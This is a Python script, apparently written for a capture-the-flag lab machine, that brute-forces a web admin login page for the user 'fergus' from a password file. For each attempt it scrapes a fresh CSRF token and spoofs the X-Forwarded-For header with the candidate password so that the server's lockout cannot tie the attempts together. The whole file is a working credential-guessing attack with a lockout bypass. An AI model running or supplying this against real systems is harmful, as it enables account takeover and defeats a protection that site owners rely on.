import requests


def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]


def main():
    url = 'http://10.10.10.191/admin/login'
    username = 'fergus'

    passwordFile = "password.txt"

    passwords = open_ressources(passwordFile)

    for password in passwords:

        print("[+] Retrieving CSRF token")

        session = requests.Session()

        r = session.get(url)
        retour = r.text

        findingToken = 'tokenCSRF" value="'
        indexStart = retour.find(findingToken)

        indexEnd = retour.find('">',indexStart)

        csrfToken = retour[int(indexStart+len(findingToken)):int(indexEnd)]

        if csrfToken != '':
            print("Success ! \n[+] CsrfToken : %s" % csrfToken)
        else :
            print("Error on csrfToken !")
            exit(1)
    

        payload = {
            'tokenCSRF':csrfToken,
            'username':username,
            'password':password,
            'save':''
        }

        header = {
            'X-Forwarded-For':password,
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0',
            'Referer':url
        }

        login = session.post(url, headers=header, data=payload, allow_redirects=False)
        print("Trying %s" % password)
    
        if 'location' in login.headers:
            print(login.headers['location'])
            if login.headers['location'].find('dashboard') != -1 :
                exit(0)

if __name__ == '__main__':
    main()
